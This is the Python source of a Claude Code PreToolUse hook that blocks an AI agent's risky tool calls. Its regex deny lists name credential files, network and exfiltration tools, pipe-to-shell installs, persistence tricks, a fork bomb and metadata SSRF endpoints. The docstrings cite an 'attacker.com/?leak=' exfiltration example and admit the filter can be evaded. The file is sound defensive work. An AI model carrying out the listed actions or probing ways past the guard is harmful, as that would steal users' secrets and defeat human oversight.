"""Claude Code ``PreToolUse`` guard: the ``fcc-hook-guard`` console script.

Claude Code invokes this program once per matched tool call, writing one JSON
object to stdin, e.g.::

    {"tool_name": "Bash", "tool_input": {"command": "curl https://x"}}

The program decides whether to allow or deny the call and speaks the documented
Claude Code 2.1.x ``PreToolUse`` contract back on stdout:

* **Allow** -> exit 0 with no stdout. This expresses "no opinion"; the normal
  permission flow proceeds (which, under ``--dangerously-skip-permissions``,
  means the call runs).
* **Deny** -> exit 0 with a JSON object on stdout::

      {"hookSpecificOutput": {"hookEventName": "PreToolUse",
                              "permissionDecision": "deny",
                              "permissionDecisionReason": "<reason>"}}

  Claude Code feeds ``permissionDecisionReason`` back to the model, so the deny
  reason both stops the call and tells the agent why.

Design notes / philosophy
-------------------------
* The guard denies only **high-signal dangerous operations** -- reading or
  writing well-known credential stores, exfiltrating data over the network,
  piping remote content into a shell, privilege escalation, destructive
  wipes, and cloud-metadata SSRF. It deliberately leaves ordinary development
  work alone (``git commit``, ``pytest``, ``npm test``, ``pip install <pkg>``,
  reading and editing project source, ``curl`` against loopback, ...).
* By default, ``WebFetch``/``WebSearch`` are denied against any **non-loopback**
  host -- this is the one rule that is deliberately broader than "high-signal
  dangerous", because an outbound fetch to an attacker-chosen host is exactly
  how a compromised provider exfiltrates data on a bare-host (non-containerized)
  run. It is configurable: ``FCC_WEBFETCH_ALLOW_HOSTS`` allowlists specific
  hosts/suffixes, and ``FCC_ALLOW_WEB_FETCH=1`` disables the rule entirely.
* It is a heuristic regex filter over tool-call JSON, **not** a shell parser, a
  taint tracker, or a sandbox. A motivated adversarial provider can construct a
  command that evades it (indirection, obfuscation, an unlisted tool). The real
  backstops remain credential-stripping in the launcher env builders and a
  sandboxed / egress-filtered deployment. See ``hardening/README.md``.
* On any internal parse problem the guard **fails open** (allows): Claude Code
  owns the trustworthy JSON envelope, and bricking every tool call over a guard
  bug would be worse than the residual risk this best-effort layer covers.
"""

import ipaddress
import json
import os
import re
import sys
from collections.abc import Mapping
from dataclasses import dataclass
from urllib.parse import urlparse

from free_claude_code.core.json_types import JsonObject, JsonValue


@dataclass(frozen=True, slots=True)
class GuardDecision:
    """Outcome of evaluating one tool call."""

    allowed: bool
    category: str = ""
    reason: str = ""


_ALLOW = GuardDecision(allowed=True)


def _deny(category: str, reason: str) -> GuardDecision:
    return GuardDecision(allowed=False, category=category, reason=reason)


# A compiled ``(pattern, category, reason)`` deny rule.
type _Rule = tuple[re.Pattern[str], str, str]


# --------------------------------------------------------------------------- #
# Text-boundary fragments shared by the path patterns below.                   #
# --------------------------------------------------------------------------- #
# What may appear immediately before a sensitive token (start, whitespace, a
# path separator, a shell separator, a quote, ``~`` or ``=``).
_PRE = r"(?:^|[\s'\"=:(,/~|>&])"
# What may appear immediately after a sensitive token (end, or a closing/
# separator character). A leading ``/`` lets a directory name be matched when
# it is followed by its contents (``.ssh/config``).
_POST = r"(?:$|[\s'\"=:),/|>&])"


def _rules(*specs: tuple[str, str, str]) -> tuple[_Rule, ...]:
    """Compile ``(pattern, category, reason)`` specs into a rule tuple."""

    return tuple(
        (re.compile(pattern), category, reason) for pattern, category, reason in specs
    )


# --------------------------------------------------------------------------- #
# (1) Secret file access -- read OR write, checked for every matched tool.     #
#     Matched against a file path (file tools), a URL/query (web tools), or    #
#     the whole command (Bash).                                                #
# --------------------------------------------------------------------------- #
_SENSITIVE_RULES: tuple[_Rule, ...] = _rules(
    # Credential directories: SSH, cloud SDKs, k8s, containers, GPG.
    (
        rf"{_PRE}\.(?:ssh|aws|kube|docker|azure|gnupg|gcp)(?:/|{_POST})",
        "secret-file",
        "targets a credential directory (~/.ssh, ~/.aws, ~/.kube, ~/.docker, "
        "~/.azure, ~/.gnupg)",
    ),
    (
        rf"\.config/(?:gcloud|gh)(?:/|{_POST})",
        "secret-file",
        "targets a cloud/GitHub CLI credential store (~/.config/gcloud, ~/.config/gh)",
    ),
    # Private-key and cert material.
    (
        rf"\.(?:pem|key|p12|pfx|keystore|jks)(?={_POST})",
        "secret-file",
        "targets a private key / certificate file (*.pem, *.key, *.p12, ...)",
    ),
    # Dotfile credential stores.
    (
        rf"{_PRE}\.(?:netrc|npmrc|pypirc|git-credentials)(?={_POST})",
        "secret-file",
        "targets a credential dotfile (~/.netrc, ~/.npmrc, ~/.pypirc, "
        "~/.git-credentials)",
    ),
    # FCC's own local proxy credentials.
    (
        r"\.fcc/(?:proxy_auth_token|\.env)\b",
        "secret-file",
        "targets the local Free Claude Code proxy credentials (~/.fcc)",
    ),
    # macOS keychains.
    (
        r"/Library/Keychains/",
        "secret-file",
        "targets the macOS Keychain store",
    ),
    (
        rf"{_PRE}[\w.-]*\.keychain(?:-db)?(?={_POST})",
        "secret-file",
        "targets a macOS keychain file",
    ),
    # Browser cookie / login databases.
    (
        r"(?:[Cc]ookies\.(?:sqlite|binarycookies)|/Cookies\b|Login Data\b"
        r"|Web Data\b|logins\.json\b|key4\.db\b)",
        "secret-file",
        "targets a browser cookie / saved-login database",
    ),
    # System credential databases.
    (
        r"/etc/(?:shadow|gshadow|master\.passwd)\b",
        "secret-file",
        "targets a system password database (/etc/shadow)",
    ),
    # Shell / REPL history (often contains pasted secrets).
    (
        rf"{_PRE}\.(?:zsh_history|bash_history|sh_history|python_history"
        rf"|node_repl_history|psql_history|mysql_history|irb_history)(?={_POST})",
        "secret-file",
        "targets a shell/REPL history file (may contain pasted secrets)",
    ),
    # macOS keychain dump via the `security` tool (a Bash command form).
    (
        r"\bsecurity\s+(?:find-generic-password|find-internet-password"
        r"|dump-keychain|export)\b",
        "secret-file",
        "dumps credentials from the macOS Keychain via `security`",
    ),
)

# Bare-name key/backdoor files. These are matched only for *location* tools
# (Read/Edit/Write/Grep path, WebFetch URL, ...), never against a whole Bash
# command line -- otherwise `grep -r 'id_rsa' .` (searching for the string)
# would be blocked. In Bash, key files are still caught by the ~/.ssh directory
# rule and the authorized_keys append rule below.
_LOCATION_ONLY_RULES: tuple[_Rule, ...] = _rules(
    (
        r"\bid_(?:rsa|dsa|ecdsa|ed25519)\b",
        "secret-file",
        "targets an SSH private key (id_rsa / id_ed25519 / ...)",
    ),
    (
        r"\bauthorized_keys\b",
        "secret-file",
        "targets the SSH authorized_keys file",
    ),
)


# `.env` files get their own handling so that committed, non-secret templates
# (`.env.example`, `.env.sample`, ...) are not treated as credentials.
_ENV_FILE_RE = re.compile(rf"\.env(?:\.([A-Za-z0-9_-]+))?(?={_POST})")
_SAFE_ENV_SUFFIXES = frozenset(
    {"example", "sample", "template", "dist", "default", "defaults"}
)


def _env_file_is_secret(text: str) -> bool:
    """Return True if ``text`` names a secret ``.env`` file (not a template)."""

    for match in _ENV_FILE_RE.finditer(text):
        suffix = match.group(1)
        if suffix is None or suffix.lower() not in _SAFE_ENV_SUFFIXES:
            return True
    return False


# --------------------------------------------------------------------------- #
# (2) Cloud-metadata SSRF -- link-local metadata endpoints (WebFetch + Bash).  #
# --------------------------------------------------------------------------- #
_SSRF_RE = re.compile(
    r"(?:169\.254\.169\.254|169\.254\.170\.2|100\.100\.100\.200"
    r"|metadata\.google\.internal|metadata\.goog\b|fd00:ec2::254)"
)


# --------------------------------------------------------------------------- #
# (3) WebFetch/WebSearch: default-deny fetches to a non-loopback host.         #
#     Closes the "web_fetch GET attacker.com/?leak=<data>" exfiltration        #
#     channel on a bare-host (non-containerized) run. Configurable via env:    #
#     an allowlist of hosts/suffixes, or a full opt-out for users who accept   #
#     the risk.                                                                #
# --------------------------------------------------------------------------- #
WEBFETCH_ALLOW_HOSTS_ENV = "FCC_WEBFETCH_ALLOW_HOSTS"
WEBFETCH_ALLOW_ENV = "FCC_ALLOW_WEB_FETCH"
_ENV_TRUTHY = frozenset({"1", "true", "yes", "on"})
_LOOPBACK_HOST_NAMES = frozenset({"localhost"})


def _webfetch_lockdown_disabled(env: Mapping[str, str]) -> bool:
    return env.get(WEBFETCH_ALLOW_ENV, "").strip().lower() in _ENV_TRUTHY


def _webfetch_allowed_hosts(env: Mapping[str, str]) -> frozenset[str]:
    raw = env.get(WEBFETCH_ALLOW_HOSTS_ENV, "")
    return frozenset(host.strip().lower() for host in raw.split(",") if host.strip())


def _host_is_loopback(host: str) -> bool:
    normalized = host.strip().lower().strip("[]")
    if normalized in _LOOPBACK_HOST_NAMES:
        return True
    try:
        return ipaddress.ip_address(normalized).is_loopback
    except ValueError:
        return False


def _host_is_allowlisted(host: str, allow_hosts: frozenset[str]) -> bool:
    normalized = host.strip().lower()
    return any(
        normalized == allowed or normalized.endswith(f".{allowed}")
        for allowed in allow_hosts
    )


def _evaluate_web_fetch_host(
    tool_name: str, tool_input: Mapping[str, JsonValue], env: Mapping[str, str]
) -> GuardDecision | None:
    """Return a deny decision if a WebFetch/WebSearch call targets a non-
    loopback host, or None ("no opinion") if the lockdown does not apply.

    ``WebFetch`` carries the target in ``url``; its host is extracted with
    ``urlparse``. ``WebSearch`` has no caller-specified host at all -- a
    search inherently reaches an external backend -- so it is denied by
    default unless the rule is disabled outright.
    """

    if _webfetch_lockdown_disabled(env):
        return None

    url = _as_str(tool_input.get("url"))
    host = urlparse(url).hostname if url else None

    if host is not None:
        if _host_is_loopback(host):
            return None
        if _host_is_allowlisted(host, _webfetch_allowed_hosts(env)):
            return None

    target = host if host else "a remote host"
    return _deny(
        "exfiltration",
        f"{tool_name} targets {target}, a non-loopback host, which is denied "
        f"by default to prevent data exfiltration. Set {WEBFETCH_ALLOW_HOSTS_ENV} "
        "(comma-separated hostnames/suffixes) to allow specific hosts, or "
        f"{WEBFETCH_ALLOW_ENV}=1 to disable this rule entirely.",
    )


# --------------------------------------------------------------------------- #
# (4) Bash: network / transfer tooling (exfiltration).                         #
# --------------------------------------------------------------------------- #
_LOOPBACK_RE = re.compile(r"(?:127\.0\.0\.1|localhost|::1|\[::1\]|0\.0\.0\.0)")
# Tools that are network operations by nature (safe to flag on mere presence).
_NET_TOOL_RE = re.compile(
    r"(?:^|[\s;&|(`$])(?:curl|wget|nc|ncat|netcat|telnet|socat|scp|sftp)\b"
)
# ssh needs a following argument (avoid matching ssh-keygen / ssh-add / -V).
_SSH_RE = re.compile(r"(?:^|[\s;&|(`$])ssh(?=\s)")
# rsync only when it names a remote spec (a plain local rsync copy is fine).
_RSYNC_REMOTE_RE = re.compile(r"\brsync\b[^\n]*?(?:[\w.-]+@[\w.-]+:|rsync://|::[\w])")


def _looks_like_exfil(command: str) -> bool:
    if _LOOPBACK_RE.search(command):
        return False
    return bool(
        _NET_TOOL_RE.search(command)
        or _SSH_RE.search(command)
        or _RSYNC_REMOTE_RE.search(command)
    )


# Inline interpreter opening a socket to a non-loopback host.
_INTERP_RE = re.compile(
    r"\b(?:python[0-9.]*|node|nodejs|ruby|perl|php)\b[^\n]*?\s-(?:c|e|r)\b"
)
_SOCKET_HINT_RE = re.compile(
    r"(?:socket\.(?:socket|create_connection)|urllib|urllib2|requests\."
    r"(?:get|post|put|request)|http\.client|httpx|net\.(?:createConnection|"
    r"Socket)|https?\.(?:get|request)|fetch\(|Net::HTTP|open-uri|LWP::)"
)


def _looks_like_interpreter_socket(command: str) -> bool:
    if _LOOPBACK_RE.search(command):
        return False
    return bool(_INTERP_RE.search(command) and _SOCKET_HINT_RE.search(command))


# Unconditional Bash deny rules, grouped by category. Evaluated in order; the
# first match wins, so the most specific / instructive reason is listed first.
_BASH_RULES: tuple[_Rule, ...] = _rules(
    # -- Remote code execution: pipe-to-shell and install-from-URL -----------
    (
        r"(?:curl|wget|fetch)\b[^\n]*\|\s*(?:sudo\s+)?"
        r"(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|ruby|perl|node)\b",
        "remote-code-exec",
        "pipes downloaded content straight into a shell/interpreter "
        "(curl | sh). Download to a file, review it, then run it.",
    ),
    (
        r"(?:<\(|\$\()\s*(?:curl|wget)\b",
        "remote-code-exec",
        "executes the output of a network fetch via process/command substitution",
    ),
    (
        r"\b(?:pip[0-9.]*|pipx)\s+(?:install|run)\b[^\n]*(?:https?://|git\+)",
        "remote-code-exec",
        "installs a Python package from a URL/VCS spec (arbitrary code "
        "execution). Install a named, pinned package instead.",
    ),
    (
        r"\buv\s+pip\s+install\b[^\n]*(?:https?://|git\+)",
        "remote-code-exec",
        "installs a Python package from a URL/VCS spec (arbitrary code execution)",
    ),
    (
        r"\b(?:npm|pnpm|yarn)\s+(?:install|i|add)\b[^\n]*"
        r"(?:https?://|git(?:\+|://)|github:|gitlab:|bitbucket:|git@)",
        "remote-code-exec",
        "installs a Node package from a git/URL spec (arbitrary code "
        "execution). Install a named, pinned package instead.",
    ),
    (
        r"\bnpx\b[^\n]*(?:https?://|github:)",
        "remote-code-exec",
        "runs npx against a URL/GitHub spec (arbitrary code execution)",
    ),
    # -- Privilege escalation / persistence / system tampering ---------------
    (
        r"(?:^|[\s;&|(])(?:sudo|doas)\b",
        "privilege-escalation",
        "runs a command as root via sudo/doas. The agent should not need "
        "elevated privileges; ask the user to run privileged steps.",
    ),
    (
        r"\b(?:csrutil\s+disable|spctl\s+--(?:master|global)-disable"
        r"|pfctl\s+-d|ufw\s+disable|visudo)\b"
        r"|socketfilterfw\b[^\n]*--setglobalstate\s+off"
        r"|systemctl\s+(?:stop|disable)\s+(?:firewalld|ufw)\b"
        r"|defaults\s+write\b[^\n]*Gatekeeper",
        "privilege-escalation",
        "disables a system security control (SIP / Gatekeeper / firewall)",
    ),
    (
        r"/etc/(?:sudoers|pam\.d)\b",
        "privilege-escalation",
        "edits sudoers / PAM configuration",
    ),
    (
        r"\blaunchctl\s+(?:load|bootstrap|enable|submit)\b"
        r"|/Library/Launch(?:Agents|Daemons)/"
        r"|~/Library/LaunchAgents\b",
        "privilege-escalation",
        "installs a launchd persistence item",
    ),
    (
        r"\bcrontab\b(?!\s+-l\b)|/etc/cron|/var/spool/cron\b"
        r"|\bat\s+(?:now\b|-f\b)",
        "privilege-escalation",
        "installs a cron/at persistence job",
    ),
    (
        r"\bssh-copy-id\b|(?:>>?|tee)\s*[^\n|]*authorized_keys\b",
        "privilege-escalation",
        "appends an SSH key to authorized_keys (backdoor)",
    ),
    (
        r"(?:>>?|tee(?:\s+-a)?)\s*(?:[^\s'\";|&]*/)?"
        r"\.(?:zshrc|bashrc|bash_profile|zprofile|zshenv|profile)\b"
        r"|\bsed\s+-i[^\n]*"
        r"\.(?:zshrc|bashrc|bash_profile|zprofile|zshenv|profile)\b"
        r"|config\.fish\b",
        "privilege-escalation",
        "writes to a shell startup file (persistence via ~/.zshrc / ~/.bashrc)",
    ),
    (
        r"\bchmod\b[^\n]*\b0?777\b",
        "privilege-escalation",
        "makes a path world-writable (chmod 777)",
    ),
    # -- Destructive wipes ---------------------------------------------------
    (
        r"\bdd\b[^\n]*\bof=/dev/(?:disk|rdisk|sd[a-z]|nvme|hd[a-z]|vd[a-z])",
        "destructive",
        "writes a raw disk device with dd",
    ),
    (
        r"\bmkfs(?:\.\w+)?\b|\bnewfs\b|\bwipefs\b|\bshred\b"
        r"|\bdiskutil\s+(?:erase|reformat|partition)"
        r"|>\s*/dev/(?:disk|rdisk|sd[a-z]|nvme|hd[a-z])",
        "destructive",
        "formats/erases a disk or filesystem",
    ),
    (
        r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"
        r"|\w*\(\)\s*\{[^}]*\|[^}]*&[^}]*\}\s*;",
        "destructive",
        "looks like a fork bomb",
    ),
    # -- Exfiltration side channels ------------------------------------------
    (
        r"\b(?:env|printenv|set)\b[^\n|]*\|[^\n]*"
        r"(?:curl|wget|nc|ncat|netcat|telnet|socat|scp|sftp|ssh)\b",
        "exfiltration",
        "pipes environment variables into a network tool",
    ),
    (
        r"\bbase64\b[^\n|]*\|[^\n]*"
        r"(?:curl|wget|nc|ncat|netcat|telnet|socat|scp|sftp|ssh)\b",
        "exfiltration",
        "pipes base64-encoded data into a network tool",
    ),
    (
        r"/dev/(?:tcp|udp)/",
        "exfiltration",
        "opens a raw network socket via /dev/tcp",
    ),
    (
        r"\b(?:dig|nslookup|host|drill)\b[^\n]*\b[A-Za-z0-9+/=_-]{28,}\.",
        "exfiltration",
        "looks like DNS exfiltration (a long encoded label in a lookup)",
    ),
    (
        r"\b(?:sendmail|ssmtp|mailx)\b|\bmail\b\s+-s\b|\|\s*mail\b",
        "exfiltration",
        "sends mail (a data exfiltration channel)",
    ),
    (
        r"\bgit\s+push\b[^\n]*(?:https?://|git@|ssh://|git://)",
        "exfiltration",
        "git-pushes to an ad-hoc URL remote (data exfiltration channel). "
        "Push to a configured named remote instead.",
    ),
)


def evaluate(
    tool_name: str,
    tool_input: Mapping[str, JsonValue],
    env: Mapping[str, str] | None = None,
) -> GuardDecision:
    """Return the guard decision for one tool call.

    This is the pure decision core exercised by the unit tests. ``main`` is a
    thin stdin/stdout shell around it.

    ``env`` supplies the process environment consulted by env-configurable
    rules (currently the WebFetch/WebSearch host lockdown). It defaults to an
    empty mapping -- not ``os.environ`` -- so this function stays a pure,
    deterministic decision core; the stdin/stdout boundary
    (``evaluate_hook_payload``) is what wires in the real environment.
    """

    effective_env = env if env is not None else {}
    scan_text = _scan_target(tool_name, tool_input)

    # (1) Secret file access -- every matched tool.
    if _env_file_is_secret(scan_text):
        return _deny(
            "secret-file",
            "targets a .env credential file. Use a committed template "
            "(.env.example) or ask the user for the value you need.",
        )
    for pattern, category, reason in _SENSITIVE_RULES:
        if pattern.search(scan_text):
            return _deny(category, reason)
    if tool_name != "Bash":
        for pattern, category, reason in _LOCATION_ONLY_RULES:
            if pattern.search(scan_text):
                return _deny(category, reason)

    # (2) Cloud-metadata SSRF -- WebFetch URL or Bash command.
    if _SSRF_RE.search(scan_text):
        return _deny(
            "metadata-ssrf",
            "targets a cloud instance-metadata endpoint (credential theft via SSRF)",
        )

    # (3) WebFetch/WebSearch -- default-deny a non-loopback host.
    if tool_name == "WebFetch" or tool_name == "WebSearch":
        decision = _evaluate_web_fetch_host(tool_name, tool_input, effective_env)
        if decision is not None:
            return decision

    # (4) Bash-only command patterns.
    if tool_name == "Bash":
        return _evaluate_bash(_as_str(tool_input.get("command")))

    return _ALLOW


def _evaluate_bash(command: str) -> GuardDecision:
    if not command:
        return _ALLOW
    for pattern, category, reason in _BASH_RULES:
        if pattern.search(command):
            return _deny(category, reason)
    if _rm_hits_root_or_home(command):
        return _deny(
            "destructive",
            "recursively removes / , ~ or $HOME",
        )
    if _looks_like_exfil(command):
        return _deny(
            "exfiltration",
            "uses a network/transfer tool (curl/wget/scp/ssh/...) against a "
            "non-loopback host. Use the WebFetch tool or the local proxy "
            "(127.0.0.1) for legitimate fetches.",
        )
    if _looks_like_interpreter_socket(command):
        return _deny(
            "exfiltration",
            "runs an inline interpreter that opens a network socket to a "
            "non-loopback host",
        )
    return _ALLOW


# `rm` with a recursive flag AND a root/home target.
_RM_RECURSIVE_RE = re.compile(
    r"\brm\b[^\n]*?(?:\s-[a-zA-Z]*r[a-zA-Z]*\b|\s--recursive\b)"
)
_RM_ROOT_TARGET_RE = re.compile(r"[\s\"'](?:/|~|\$HOME|\$\{HOME\})(?:[\s\"']|/?\*|$)")


def _rm_hits_root_or_home(command: str) -> bool:
    return bool(_RM_RECURSIVE_RE.search(command) and _RM_ROOT_TARGET_RE.search(command))


# --------------------------------------------------------------------------- #
# Per-tool scan-target extraction.                                            #
# --------------------------------------------------------------------------- #
_PATH_KEYS = ("file_path", "notebook_path", "path")
_WEB_KEYS = ("url", "query")
_GLOB_KEYS = ("path", "glob", "pattern")


def _scan_target(tool_name: str, tool_input: Mapping[str, JsonValue]) -> str:
    """Return the text a given tool's sensitive-path/SSRF rules scan.

    Deliberately narrow to reduce false positives: file tools scan only their
    *location* (not file contents, so editing a doc that mentions ``.ssh`` is
    fine); Grep/Glob scan the searched *location* (not the ``pattern``, so
    grepping for the string "id_rsa" is fine); web tools scan the URL/query;
    Bash scans the whole command.
    """

    if tool_name == "Bash":
        return _as_str(tool_input.get("command"))
    if tool_name == "WebFetch" or tool_name == "WebSearch":
        return _join_keys(tool_input, _WEB_KEYS)
    if tool_name == "Grep" or tool_name == "Glob":
        return _join_keys(tool_input, ("path", "glob"))
    if tool_name in _FILE_TOOL_NAMES:
        return _join_keys(tool_input, _PATH_KEYS)
    # Unknown tool: scan every plausible location/URL field conservatively.
    return _join_keys(tool_input, _PATH_KEYS + _WEB_KEYS + _GLOB_KEYS)


_FILE_TOOL_NAMES = frozenset(
    {"Read", "Edit", "Write", "MultiEdit", "NotebookEdit", "NotebookRead"}
)


def _join_keys(tool_input: Mapping[str, JsonValue], keys: tuple[str, ...]) -> str:
    parts = [_as_str(tool_input.get(key)) for key in keys]
    return "\n".join(part for part in parts if part)


def _as_str(value: JsonValue | None) -> str:
    return value if isinstance(value, str) else ""


# --------------------------------------------------------------------------- #
# stdin/stdout entry point.                                                    #
# --------------------------------------------------------------------------- #
def evaluate_hook_payload(
    raw: str, env: Mapping[str, str] | None = None
) -> GuardDecision:
    """Parse a raw ``PreToolUse`` stdin payload and evaluate it (fail-open).

    ``env`` defaults to the real process environment (``os.environ``) -- this
    is the IO boundary that wires env-configurable rules (the WebFetch host
    lockdown) to the user's actual ``FCC_WEBFETCH_ALLOW_HOSTS`` /
    ``FCC_ALLOW_WEB_FETCH`` settings.
    """

    try:
        parsed: JsonValue = json.loads(raw)
    except json.JSONDecodeError, ValueError:
        return _ALLOW
    if not isinstance(parsed, dict):
        return _ALLOW
    tool_name = parsed.get("tool_name")
    if not isinstance(tool_name, str):
        return _ALLOW
    tool_input = parsed.get("tool_input")
    effective_env = env if env is not None else os.environ
    if not isinstance(tool_input, dict):
        return evaluate(tool_name, {}, env=effective_env)
    return evaluate(tool_name, tool_input, env=effective_env)


def render_deny_output(decision: GuardDecision) -> JsonObject:
    """Return the Claude Code ``PreToolUse`` deny JSON for ``decision``."""

    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": f"fcc-hook-guard: {decision.reason}",
        }
    }


def main() -> int:
    """Console-script entry point for ``fcc-hook-guard``."""

    decision = evaluate_hook_payload(sys.stdin.read())
    if decision.allowed:
        return 0
    json.dump(render_deny_output(decision), sys.stdout)
    sys.stdout.write("\n")
    # Mirror to stderr for human-visible transcripts; it does not affect the
    # decision (the stdout JSON does).
    print(
        f"fcc-hook-guard: blocked [{decision.category}] {decision.reason}",
        file=sys.stderr,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
